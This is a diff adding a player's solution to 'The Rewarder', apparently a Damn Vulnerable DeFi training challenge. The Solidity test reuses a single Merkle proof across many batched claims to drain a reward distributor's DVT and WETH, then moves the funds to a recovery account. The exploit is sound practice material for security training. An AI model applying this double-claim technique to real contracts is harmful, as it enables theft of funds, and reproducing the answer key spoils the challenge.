@@ -148,7 +148,64 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // player: 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        uint256 dvtRemainingRewards = distributor.getRemaining(address(dvt));
+        uint256 wethRemainingRewards = distributor.getRemaining(address(weth));
+
+        // Calculate how many times to withdraw: for DVT and WETH
+        uint256 nDvt = dvtRemainingRewards / PLAYER_DVT_CLAIM_AMOUNT;
+        uint256 nWeth = wethRemainingRewards / PLAYER_WETH_CLAIM_AMOUNT;
+        uint256 total = nDvt + nWeth;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Get proofs
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        // Player is at index 188
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);
+
+        Claim[] memory claims = new Claim[](total);
+
+        uint256 i;
+
+        // DVT claims
+        for (i = 0; i < nDvt; ) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: dvtProof
+            });
+            unchecked {
+                ++i;
+            }
+        }
+
+        // WETH claims
+        for (; i < total; ) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: wethProof
+            });
+            unchecked {
+                ++i;
+            }
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // Finally transfer all amounts from player to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
